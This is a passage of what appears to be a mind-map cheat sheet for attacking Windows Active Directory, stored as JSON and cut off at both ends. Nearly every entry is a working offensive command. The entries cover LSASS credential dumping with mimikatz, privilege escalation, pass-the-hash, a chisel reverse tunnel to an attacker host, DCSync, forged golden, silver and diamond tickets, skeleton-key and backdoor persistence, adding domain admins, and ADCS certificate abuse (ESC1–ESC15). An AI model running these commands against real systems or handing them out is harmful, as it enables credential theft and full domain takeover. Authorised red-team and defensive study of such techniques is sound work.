lsass.dmp</code>","children":[],"payload":{"tag":"li","lines":"1233,1234"}},{"content":"<code>mimikatz &gt; sekurlsa::minidump lsass.dmp</code>","children":[],"payload":{"tag":"li","lines":"1234,1235"}},{"content":"<code>mimikatz &gt; sekurlsa::logonpasswords</code>","children":[],"payload":{"tag":"li","lines":"1235,1237"}}],"payload":{"tag":"h3","lines":"1232,1233"}}],"payload":{"tag":"h2","lines":"1218,1219"}},{"content":"Privilege Escalation","children":[{"content":"Run WinPEAS or Seatbelt","children":[{"content":"\n<p data-lines=\"1242,1243\"><code>WinPEAS.bat</code></p>","children":[],"payload":{"tag":"li","lines":"1242,1243"}},{"content":"\n<p data-lines=\"1243,1244\"><code>Seatbelt.exe -group=all</code></p>","children":[],"payload":{"tag":"li","lines":"1243,1245"}},{"content":"\n<p data-lines=\"1245,1246\">Look for service misconfigs, token privileges, unquoted paths</p>","children":[],"payload":{"tag":"li","lines":"1245,1247"}}],"payload":{"tag":"h3","lines":"1241,1242"}},{"content":"Token Impersonation / Juicy Potato","children":[{"content":"<code>JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t *</code>","children":[],"payload":{"tag":"li","lines":"1248,1250"}}],"payload":{"tag":"h3","lines":"1247,1248"}},{"content":"BloodHound Collection","children":[{"content":"\n<p data-lines=\"1251,1252\"><code>SharpHound.exe -c All</code></p>","children":[],"payload":{"tag":"li","lines":"1251,1253"}},{"content":"\n<p data-lines=\"1253,1254\">Output is a .zip &#x2192; import into BloodHound GUI for path analysis</p>","children":[],"payload":{"tag":"li","lines":"1253,1254"}},{"content":"\n<p data-lines=\"1254,1255\">Import into BloodHound, analyze shortest path to DA</p>","children":[],"payload":{"tag":"li","lines":"1254,1256"}}],"payload":{"tag":"h3","lines":"1250,1251"}}],"payload":{"tag":"h2","lines":"1239,1240"}},{"content":"Lateral Movement","children":[{"content":"Pass-the-Hash","children":[{"content":"<code>wmiexec.py domain/user@target -hashes &lt;LM&gt;:&lt;NT&gt;</code>","children":[],"payload":{"tag":"li","lines":"1261,1263"}}],"payload":{"tag":"h3","lines":"1260,1261"}},{"content":"PSExec Over SMB","children":[{"content":"<code>psexec.py domain/user@target -hashes &lt;LM&gt;:&lt;NT&gt;</code>","children":[],"payload":{"tag":"li","lines":"1264,1266"}}],"payload":{"tag":"h3","lines":"1263,1264"}},{"content":"Chisel Tunnel","children":[{"content":"<code>./chisel server -p 8000 --reverse</code>","children":[],"payload":{"tag":"li","lines":"1267,1268"}},{"content":"<code>./chisel client &lt;attacker&gt;:8000 R:1080:&lt;internal_host&gt;:445</code>","children":[],"payload":{"tag":"li","lines":"1268,1270"}}],"payload":{"tag":"h3","lines":"1266,1267"}}],"payload":{"tag":"h2","lines":"1258,1259"}},{"content":"Domain Dominance","children":[{"content":"DCSync Attack","children":[{"content":"<code>secretsdump.py -just-dc domain/user@dc</code>","children":[],"payload":{"tag":"li","lines":"1275,1277"}}],"payload":{"tag":"h3","lines":"1274,1275"}},{"content":"RBCD (Resource-Based Constrained Delegation)","children":[{"content":"<code>Powermad + Rubeus for delegation abuse</code>","children":[],"payload":{"tag":"li","lines":"1278,1280"}}],"payload":{"tag":"h3","lines":"1277,1278"}},{"content":"ADCS Misconfig Enumeration","children":[{"content":"\n<p data-lines=\"1281,1282\"><code>Certify.exe find /vulnerable</code></p>","children":[],"payload":{"tag":"li","lines":"1281,1283"}},{"content":"\n<p data-lines=\"1283,1284\">Look for ESC1&#x2013;ESC8 vulnerable templates &#x2192; abuse with <code>Certify request</code> or <code>ForgeCert</code></p>","children":[],"payload":{"tag":"li","lines":"1283,1285"}}],"payload":{"tag":"h3","lines":"1280,1281"}}],"payload":{"tag":"h2","lines":"1272,1273"}},{"content":"Persistence","children":[{"content":"AdminSDHolder Inheritance","children":[{"content":"<code>Set-DomainObjectAcl -TargetIdentity &quot;CN=AdminSDHolder,CN=System,DC=...&quot; -Rights All</code>","children":[],"payload":{"tag":"li","lines":"1290,1292"}}],"payload":{"tag":"h3","lines":"1289,1290"}},{"content":"Scheduled Task Creation","children":[{"content":"<code>schtasks /create /tn backdoor /tr cmd.exe /sc onlogon</code>","children":[],"payload":{"tag":"li","lines":"1293,1295"}}],"payload":{"tag":"h3","lines":"1292,1293"}},{"content":"WMI Event Subscription","children":[{"content":"<code>Invoke-WmiBackdoor</code>","children":[],"payload":{"tag":"li","lines":"1296,1298"}}],"payload":{"tag":"h3","lines":"1295,1296"}},{"content":"ADD DA","children":[{"content":"<code>net group &quot;domain admins&quot; myuser /add /domain</code>","children":[],"payload":{"tag":"li","lines":"1299,1301"}}],"payload":{"tag":"h3","lines":"1298,1299"}},{"content":"Golden ticket","children":[{"content":"<code>ticketer.py -aesKey &lt;aeskey&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain&gt; &lt;anyuser&gt;</code>","children":[],"payload":{"tag":"li","lines":"1302,1303"}},{"content":"<code>mimikatz &quot;kerberos::golden /user:&lt;admin_user&gt; /domain:&lt;domain&gt; /sid:&lt;domain-sid&gt;/aes256:&lt;krbtgt_aes256&gt; /ptt&quot;</code>","children":[],"payload":{"tag":"li","lines":"1303,1305"}}],"payload":{"tag":"h3","lines":"1301,1302"}},{"content":"Silver Ticket","children":[{"content":"<code>mimikatz &quot;kerberos::golden /sid:&lt;current_user_sid&gt; /domain:&lt;domain-sid&gt; /target:&lt;target_server&gt; /service:&lt;target_service&gt; /aes256:&lt;computer_aes256_key&gt; /user:&lt;any_user&gt; /ptt&quot;</code>","children":[],"payload":{"tag":"li","lines":"1306,1307"}},{"content":"<code>ticketer.py -nthash &lt;machine_nt_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain&gt; &lt;anyuser&gt;</code>","children":[],"payload":{"tag":"li","lines":"1307,1309"}}],"payload":{"tag":"h3","lines":"1305,1306"}},{"content":"Directory Service Restore Mode (DSRM)","children":[{"content":"<code>PowerShell New-ItemProperty &quot;HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\&quot; -Name &quot;DsrmAdminLogonBehavior&quot; -Value 2 -PropertyType DWORD</code>","children":[],"payload":{"tag":"li","lines":"1310,1312"}}],"payload":{"tag":"h3","lines":"1309,1310"}},{"content":"Skeleton Key","children":[{"content":"<code>mimikatz &quot;privilege::debug&quot; &quot;misc::skeleton&quot; &quot;exit&quot; #password is mimikatz</code>","children":[],"payload":{"tag":"li","lines":"1313,1315"}}],"payload":{"tag":"h3","lines":"1312,1313"}},{"content":"Custom SSP","children":[{"content":"<code>mimikatz &quot;privilege::debug&quot; &quot;misc::memssp&quot; &quot;exit&quot;</code>","children":[{"content":"C:\\Windows\\System32\\kiwissp.log","children":[],"payload":{"tag":"li","lines":"1317,1319"}}],"payload":{"tag":"li","lines":"1316,1319"}}],"payload":{"tag":"h3","lines":"1315,1316"}},{"content":"Golden certificate","children":[{"content":"<code>certipy ca -backup -ca &apos;&lt;ca_name&gt;&apos; -username &lt;user&gt;@&lt;domain&gt; -hashes &lt;hash&gt;</code>","children":[{"content":"<code>certipy forge -ca-pfx &lt;ca_private_key&gt; -upn &lt;user&gt;@&lt;domain&gt; -subject &apos;CN=&lt;user&gt;,CN=Users,DC=&lt;CORP&gt;,DC=&lt;LOCAL&gt;</code>","children":[],"payload":{"tag":"li","lines":"1321,1323"}}],"payload":{"tag":"li","lines":"1320,1323"}}],"payload":{"tag":"h3","lines":"1319,1320"}},{"content":"Diamond ticket","children":[{"content":"<code>ticketer.py -request -domain &lt;domain&gt; -user &lt;user&gt; -password &lt;password&gt; -nthash &lt;hash&gt; -aesKey &lt;aeskey&gt; -domain-sid &lt;domain_sid&gt;  -user-id &lt;user_id&gt; -groups &apos;512,513,518,519,520&apos; &lt;anyuser&gt;</code>","children":[],"payload":{"tag":"li","lines":"1324,1326"}}],"payload":{"tag":"h3","lines":"1323,1324"}},{"content":"Saphire Ticket","children":[{"content":"<code>ticketer.py -request -impersonate &lt;anyuser&gt; -domain &lt;domain&gt; -user &lt;user&gt; -password &lt;password&gt;  -nthash &lt;hash&gt; -aesKey &lt;aeskey&gt; -domain-sid &lt;domain_sid&gt;  &apos;ignored&apos;</code>","children":[],"payload":{"tag":"li","lines":"1327,1329"}}],"payload":{"tag":"h3","lines":"1326,1327"}}],"payload":{"tag":"h2","lines":"1287,1288"}},{"content":"ADCS","children":[{"content":"Enumeration &gt;&gt;&gt; Web enrollement || Vulnerable template || Vulnerable CA || Misconfigured ACL || Vulnerable PKI Object AC","children":[{"content":"<code>certutil -v -dsTemplate</code>","children":[],"payload":{"tag":"li","lines":"1332,1333"}},{"content":"<code>certify.exe find [ /vulnerable]</code>","children":[],"payload":{"tag":"li","lines":"1333,1334"}},{"content":"<code>certipy find -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -dc-ip &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1334,1335"}},{"content":"<code>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s &lt;dc_ip&gt; templates</code>","children":[],"payload":{"tag":"li","lines":"1335,1336"}},{"content":"Get PKI objects information","children":[{"content":"<code>certify.exe pkiobjects</code>","children":[],"payload":{"tag":"li","lines":"1337,1338"}}],"payload":{"tag":"li","lines":"1336,1338"}},{"content":"Display CA information","children":[{"content":"<code>certutil -TCAInfo</code>","children":[],"payload":{"tag":"li","lines":"1339,1340"}},{"content":"<code>certify.exe cas</code>","children":[],"payload":{"tag":"li","lines":"1340,1342"}}],"payload":{"tag":"li","lines":"1338,1342"}}],"payload":{"tag":"h3","lines":"1331,1332"}},{"content":"Web Enrollment Is Up &gt;&gt;&gt; Domain admin","children":[{"content":"ESC8 &gt;&gt;&gt; Pass the ticket &gt;&gt;&gt; DCSYNC || LDAP shell","children":[{"content":"<code>ntlmrelayx.py -t http://&lt;dc_ip&gt;/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController</code>","children":[{"content":"<code>Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt</code>","children":[],"payload":{"tag":"li","lines":"1345,1346"}},{"content":"<code>gettgtpkinit.py -pfx-base64 &#x24;(cat cert.b64) &lt;domain&gt;/&lt;dc_name&gt;&#x24; &lt;ccache_file&gt;</code>","children":[],"payload":{"tag":"li","lines":"1346,1347"}}],"payload":{"tag":"li","lines":"1344,1347"}},{"content":"<code>certipy relay -target http://&lt;ip_ca&gt;</code>","children":[{"content":"<code>certipy auth -pfx &lt;certificate&gt; -dc-ip &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1348,1350"}}],"payload":{"tag":"li","lines":"1347,1350"}}],"payload":{"tag":"li","lines":"1343,1350"}}],"payload":{"tag":"h3","lines":"1342,1343"}},{"content":"Misconfigured Certificate Template","children":[{"content":"ESC1 &gt;&gt;&gt; Pass the certificate","children":[{"content":"<code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &apos;&lt;vulnerable template name&gt;&apos;  -ca &lt;ca_name&gt; -upn &lt;target_user&gt;@&lt;domain&gt;</code>","children":[],"payload":{"tag":"li","lines":"1352,1353"}},{"content":"<code>certify.exe request /ca:&lt;server&gt;\\&lt;ca-name&gt;   /template:&quot;&lt;vulnerable template name&gt;&quot; [/altname:&quot;Admin&quot;]</code>","children":[],"payload":{"tag":"li","lines":"1353,1354"}}],"payload":{"tag":"li","lines":"1351,1354"}},{"content":"ESC2 &gt;&gt;&gt; ESC3","children":[],"payload":{"tag":"li","lines":"1354,1355"}},{"content":"ESC3","children":[{"content":"<code>certify.exe request /ca:&lt;server&gt;\\&lt;ca-name&gt; /template:&quot;&lt;vulnerable template name&gt;&quot;</code>","children":[{"content":"<code>certify.exe request request /ca:&lt;server&gt;\\&lt;ca-name&gt; /template:&lt;template&gt;  /onbehalfof:&lt;domain&gt;\\&lt;user&gt; /enrollcert:&lt;path.pfx&gt; [/enrollcertpw:&lt;cert-password&gt;]</code>","children":[],"payload":{"tag":"li","lines":"1357,1358"}}],"payload":{"tag":"li","lines":"1356,1358"}},{"content":"<code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &apos;&lt;vulnerable template name&gt;&apos;  -ca &lt;ca_name&gt;</code>","children":[{"content":"<code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template  &apos;&lt;vulnerable template name&gt;&apos;  -ca &lt;ca_name&gt; -on-behalf-of &apos;&lt;domain&gt;\\&lt;user&gt;&apos; -pfx &lt;cert&gt;</code>","children":[],"payload":{"tag":"li","lines":"1359,1360"}}],"payload":{"tag":"li","lines":"1358,1360"}}],"payload":{"tag":"li","lines":"1355,1360"}},{"content":"ESC13 &gt;&gt;&gt; Pass The Certificate (PKINIT)","children":[{"content":"<code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt;  -template &apos;&lt;vulnerable template name&gt;&apos; -ca &lt;ca_name&gt;</code>","children":[],"payload":{"tag":"li","lines":"1361,1362"}},{"content":"<code>certify.exe request /ca:&lt;server&gt;\\&lt;ca-name&gt; /template:&quot;&lt;vulnerable template name&gt;&quot;</code>","children":[],"payload":{"tag":"li","lines":"1362,1363"}}],"payload":{"tag":"li","lines":"1360,1363"}},{"content":"ESC15","children":[{"content":"<code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &apos;&lt;version 1 template with enrolee flag&gt;&apos; -ca &lt;ca_name&gt; -upn &lt;target_user&gt;@&lt;domain&gt; --application-policies &apos;Client Authentication&apos; #[PR 228]</code> &gt;&gt;&gt; Pass the certificate (only Schannel)","children":[],"payload":{"tag":"li","lines":"1364,1365"}},{"content":"<code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &apos;&lt;version 1 template with enrolee flag&gt;&apos; -ca &lt;ca_name&gt; --application-policies &apos;Certificate Request Agent&apos; # [PR 228]</code> &gt;&gt;&gt; Pass the certificate","children":[{"content":"<code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &apos;&lt;vulnerable template name&gt;&apos; -ca &lt;ca_name&gt; -on-behalf-of &apos;&lt;domain&gt;\\&lt;user&gt;&apos; -pfx &lt;cert&gt;</code>","children":[],"payload":{"tag":"li","lines":"1366,1368"}}],"payload":{"tag":"li","lines":"1365,1368"}}],"payload":{"tag":"li","lines":"1363,1368"}}],"payload":{"tag":"h3","lines":"1350,1351"}},{"content":"Misconfigured ACL","children":[{"content":"\n<p data-lines=\"1369,1370\">ESC4</p>","children":[{"content":"write privilege over a certificate template","children":[{"content":"<code>certipy template -u &lt;user&gt;@&lt;domain&gt; -p &apos;&lt;password&gt;&apos; -template &lt;vuln_template&gt; -save-old -debug</code> &gt;&gt;&gt; ESC1","children":[],"payload":{"tag":"li","lines":"1371,1372"}},{"content":"restore template","children":[{"content":"<code>certipy template -u &lt;user&gt;@&lt;domain&gt; -p &apos;&lt;password&gt;&apos; -template &lt;vuln_template&gt; -configuration &lt;template&gt;.json</code>","children":[],"payload":{"tag":"li","lines":"1373,1375"}}],"payload":{"tag":"li","lines":"1372,1375"}}],"payload":{"tag":"li","lines":"1370,1375"}}],"payload":{"tag":"li","lines":"1369,1375"}},{"content":"\n<p data-lines=\"1375,1376\">ESC7</p>","children":[{"content":"Manage CA","children":[{"content":"<code>certipy ca -ca &lt;ca_name&gt; -add-officer  &apos;&lt;user&gt;&apos; -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt; -dc-ip &lt;dc_ip&gt; -target-ip &lt;target_ip&gt;</code> &gt;&gt;&gt; ESC7 Manage certificate","children":[],"payload":{"tag":"li","lines":"1377,1378"}}],"payload":{"tag":"li","lines":"1376,1378"}},{"content":"Manage certificate","children":[{"content":"<code>certipy ca  -ca &lt;ca_name&gt; -enable-template &apos;&lt;ecs1_vuln_template&gt;&apos; -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt;</code>","children":[{"content":"<code>certipy  req -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt; -ca &lt;ca_name&gt; -template &apos;&lt;vulnerable template name&gt;&apos; -upn &apos;&lt;target_user&gt;&apos;</code>","children":[{"content":"error, but save private key and get issue request","children":[],"payload":{"tag":"li","lines":"1381,1382"}}],"payload":{"tag":"li","lines":"1380,1382"}}],"payload":{"tag":"li","lines":"1379,1382"}},{"content":"Issue request","children":[{"content":"<code>certipy ca -u &lt;user&gt;@&lt;domain&gt; -p &apos;&lt;password&gt;&apos; -ca &lt;ca_name&gt; -issue-request &lt;request_id&gt;</code>","children":[{"content":"<code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &apos;&lt;password&gt;&apos;  -ca &lt;ca_name&gt; -retreive &lt;request_id&gt;</code> &gt;&gt;&gt; Pass the certificate","children":[],"payload":{"tag":"li","lines":"1384,1386"}}],"payload":{"tag":"li","lines":"1383,1386"}}],"payload":{"tag":"li","lines":"1382,1386"}}],"payload":{"tag":"li","lines":"1378,1386"}}],"payload":{"tag":"li","lines":"1375,1386"}}],"payload":{"tag":"h3","lines":"1368,1369"}},{"content":"Vulnerable PKI Object access control","children":[{"content":"ESC5","children":[{"content":"Vulnerable acl on PKI &gt;&gt;&gt; ACL","children":[],"payload":{"tag":"li","lines":"1389,1390"}},{"content":"Golden certificate","children":[{"content":"<code>certipy ca -backup -u &lt;user&gt;@&lt;domain&gt; -hashes &lt;hash_nt&gt; -ca &lt;ca_name&gt; -debug -target &lt;ca_ip&gt;</code>","children":[{"content":"<code>certipy forge -ca-pfx &apos;&lt;adcs&gt;.pfx&apos; -upn administrator@&lt;domain&gt;</code> &gt;&gt;&gt; Pass the certificate","children":[],"payload":{"tag":"li","lines":"1392,1394"}}],"payload":{"tag":"li","lines":"1391,1394"}}],"payload":{"tag":"li","lines":"1390,1394"}}],"payload":{"tag":"li","lines":"1388,1394"}}],"payload":{"tag":"h3","lines":"1386,1387"}},{"content":"Misconfigured Certificate Authority","children":[{"content":"\n<p data-lines=\"1396,1397\">ESC6 @CVE@ &gt;&gt;&gt; ESC1</p>","children":[{"content":"Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication","children":[],"payload":{"tag":"li","lines":"1397,1399"}}],"payload":{"tag":"li","lines":"1396,1399"}},{"content":"\n<p data-lines=\"1399,1400\">ESC11 &gt;&gt;&gt; Pass the ticket &gt;&gt;&gt; DCSYNC &gt;&gt;&gt; Domain Admin</p>","children":[{"content":"<code>ntlmrelayx.py -t rpc://&lt;ca_ip&gt; -smb2support -rpc-mode ICPR -icpr-ca-name &lt;ca_name&gt;</code>","children":[{"content":"<code>Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt</code>","children":[],"payload":{"tag":"li","lines":"1401,1402"}},{"content":"<code>gettgtpkinit.py -pfx-base64 &#x24;(cat cert.b64) &lt;domain&gt;/&lt;dc_name&gt;&#x24; &lt;ccache_file&gt;</code>","children":[],"payload":{"tag":"li","lines":"1402,1403"}}],"payload":{"tag":"li","lines":"1400,1403"}},{"content":"<code>certipy relay -target rpc://&lt;ip_ca&gt; -ca &apos;&lt;ca_name&gt;&apos;</code>","children":[{"content":"<code>certipy auth -pfx &lt;certificate&gt; -dc-ip &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1404,1406"}}],"payload":{"tag":"li","lines":"1403,1406"}}],"payload":{"tag":"li","lines":"1399,1406"}}],"payload":{"tag":"h3","lines":"1394,1395"}},{"content":"Abuse Certificate Mapping","children":[{"content":"\n<p data-lines=\"1408,1409\">ESC9/ESC10 (implicit)</p>","children":[{"content":"<code>certipy shadow auto -username &lt;accountA&gt;@&lt;domain&gt; -p &lt;passA&gt; -account &lt;accountB&gt;</code>","children":[{"content":"ESC9/ESC10 (Case 1)","children":[{"content":"<code>certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn Administrator</code> &gt;&gt;&gt; reset accountB UPN","children":[{"content":"ESC9","children":[{"content":"<code>certipy req  -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;vulnerable template&gt;</code>","children":[],"payload":{"tag":"li","lines":"1413,1414"}}],"payload":{"tag":"li","lines":"1412,1414"}},{"content":"ESC10 (case 1)","children":[{"content":"<code>certipy req  -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;any template with client auth&gt;</code>","children":[],"payload":{"tag":"li","lines":"1415,1416"}}],"payload":{"tag":"li","lines":"1414,1416"}}],"payload":{"tag":"li","lines":"1411,1416"}}],"payload":{"tag":"li","lines":"1410,1416"}},{"content":"ESC10 (Case 2)","children":[{"content":"<code>certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn &apos;&lt;dc_name&#x24;&gt;@&lt;domain&gt;&apos;</code> &gt;&gt;&gt; ESC10  Case1","children":[],"payload":{"tag":"li","lines":"1417,1418"}}],"payload":{"tag":"li","lines":"1416,1418"}}],"payload":{"tag":"li","lines":"1409,1418"}},{"content":"reset accountB UPN","children":[{"content":"<code>certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn &lt;accountB&gt;@&lt;domain&gt;</code> &gt;&gt;&gt; Pass The Certificate","children":[{"content":"[Kerberos Mapping] ESC9/ESC10(Case 1)","children":[],"payload":{"tag":"li","lines":"1420,1421"}},{"content":"[Schannel Mapping] ESC9/ESC10 (Case 2)","children":[],"payload":{"tag":"li","lines":"1421,1423"}}],"payload":{"tag":"li","lines":"1419,1423"}}],"payload":{"tag":"li","lines":"1418,1423"}}],"payload":{"tag":"li","lines":"1408,1423"}},{"content":"\n<p data-lines=\"1423,1424\">ESC14 (explicit)</p>","children":[],"payload":{"tag":"li","lines":"1423,1425"}}],"payload":{"tag":"h3","lines":"1406,1407"}}],"payload":{"tag":"h2","lines":"1329,1330"}},{"content":"Lateral Move","children":[{"content":"Clear text Password &gt;&gt;&gt; Admin","children":[{"content":"Interactive-shell - psexec &gt;&gt;&gt; Authority/System","children":[{"content":"<code>psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1430,1431"}},{"content":"<code>psexec.exe -AcceptEULA \\\\&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1431,1432"}},{"content":"<code>psexecsvc.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1432,1433"}}],"payload":{"tag":"li","lines":"1429,1433"}},{"content":"Pseudo-shell (file write and read)","children":[{"content":"<code>atexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; &quot;command&quot;</code>","children":[],"payload":{"tag":"li","lines":"1434,1435"}},{"content":"<code>smbexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1435,1436"}},{"content":"<code>wmiexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1436,1437"}},{"content":"<code>dcomexec.py  &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1437,1438"}},{"content":"<code>nxc smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -x &lt;cmd&gt;</code>","children":[],"payload":{"tag":"li","lines":"1438,1439"}}],"payload":{"tag":"li","lines":"1433,1439"}},{"content":"WinRM &gt;&gt;&gt; Low access || Admin","children":[{"content":"<code>evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt;</code>","children":[],"payload":{"tag":"li","lines":"1440,1441"}},{"content":"<code>Enter-PSSession -ComputerName &lt;computer&gt; -Credential &lt;domain&gt;\\&lt;user&gt;</code>","children":[],"payload":{"tag":"li","lines":"1441,1442"}},{"content":"<code>nxc winrm &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -x &lt;cmd&gt;</code>","children":[],"payload":{"tag":"li","lines":"1442,1443"}}],"payload":{"tag":"li","lines":"1439,1443"}},{"content":"RDP &gt;&gt;&gt; Low access || Admin","children":[{"content":"<code>xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /p:&lt;password&gt; /v:&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1444,1445"}}],"payload":{"tag":"li","lines":"1443,1445"}},{"content":"SMB &gt;&gt;&gt; Search files","children":[{"content":"<code>smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1446,1447"}},{"content":"<code>smbclient-ng.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; --host &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1447,1448"}}],"payload":{"tag":"li","lines":"1445,1448"}},{"content":"MSSQL &gt;&gt;&gt; MSSQL","children":[{"content":"<code>nxc mssql &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt;</code>","children":[],"payload":{"tag":"li","lines":"1449,1450"}},{"content":"<code>mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1450,1452"}}],"payload":{"tag":"li","lines":"1448,1452"}}],"payload":{"tag":"h3","lines":"1428,1429"}},{"content":"NT Hash","children":[{"content":"Pass the Hash","children":[{"content":"MSSQL/PseudoShell PsExec/SMB...  &gt;&gt;&gt; Admin","children":[{"content":"<code>impacket : same as with creds, but use -hashes &apos;:&lt;hash&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1455,1456"}},{"content":"<code>nxc : same as with creds, but use -H &apos;:&lt;hash&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1456,1457"}}],"payload":{"tag":"li","lines":"1454,1457"}},{"content":"<code>mimikatz &quot;privilege::debug sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt;&quot;</code> &gt;&gt;&gt; Admin","children":[],"payload":{"tag":"li","lines":"1457,1458"}},{"content":"RDP &gt;&gt;&gt; Low access || Admin","children":[{"content":"<code>reg.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -hashes &apos;:&lt;hash&gt;&apos; add -keyName &apos;HKLM\\System\\CurrentControlSet\\Control\\Lsa&apos; -v &apos;DisableRestrictedAdmin&apos; -vt &apos;REG_DWORD&apos; -vd &apos;0&apos;</code>","children":[{"content":"<code>xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1460,1461"}}],"payload":{"tag":"li","lines":"1459,1461"}}],"payload":{"tag":"li","lines":"1458,1461"}},{"content":"WinRM &gt;&gt;&gt; Low access || Admin","children":[{"content":"<code>evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -H &lt;hash&gt;</code>","children":[],"payload":{"tag":"li","lines":"1462,1463"}}],"payload":{"tag":"li","lines":"1461,1463"}}],"payload":{"tag":"li","lines":"1453,1463"}},{"content":"Overpass the Hash / Pass the key (PTK) &gt;&gt;&gt; Admin","children":[{"content":"<code>Rubeus.exe asktgt /user:victim /rc4:&lt;rc4value&gt;</code>","children":[{"content":"<code>Rubeus.exe ptt /ticket:&lt;ticket&gt;</code>","children":[],"payload":{"tag":"li","lines":"1465,1466"}},{"content":"<code>Rubeus.exe createnetonly /program:C:\\Windows\\System32\\[cmd.exe||upnpcont.exe]</code>","children":[],"payload":{"tag":"li","lines":"1466,1467"}}],"payload":{"tag":"li","lines":"1464,1467"}},{"content":"<code>getTGT.py &lt;domain&gt;/&lt;user&gt; -hashes :&lt;hashes&gt;</code>","children":[],"payload":{"tag":"li","lines":"1467,1469"}}],"payload":{"tag":"li","lines":"1463,1469"}}],"payload":{"tag":"h3","lines":"1452,1453"}},{"content":"Kerberos","children":[{"content":"\n<p data-lines=\"1470,1471\">Pass the Ticket (ccache / kirbi)</p>","children":[{"content":"Convert Format","children":[{"content":"<code>ticketConverter.py &lt;kirbi||ccache&gt; &lt;ccache||kirbi&gt;</code>","children":[],"payload":{"tag":"li","lines":"1472,1473"}}],"payload":{"tag":"li","lines":"1471,1473"}},{"content":"<code>export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache</code> &gt;&gt;&gt; Admin","children":[{"content":"<code>impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket</code>","children":[],"payload":{"tag":"li","lines":"1474,1475"}}],"payload":{"tag":"li","lines":"1473,1475"}},{"content":"<code>mimikatz kerberos::ptc &quot;&lt;ticket&gt;&quot;</code>","children":[],"payload":{"tag":"li","lines":"1475,1476"}},{"content":"<code>Rubeus.exe ptt /ticket:&lt;ticket&gt;</code>","children":[],"payload":{"tag":"li","lines":"1476,1477"}},{"content":"<code>proxychains secretsdump.py -k&apos;&lt;domain&gt;&apos;/&apos;&lt;user&gt;&apos;@&apos;&lt;ip&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1477,1478"}},{"content":"Modify SPN &gt;&gt;&gt; PassTheTicket","children":[{"content":"<code>tgssub.py -in &lt;ticket.ccache&gt; -out 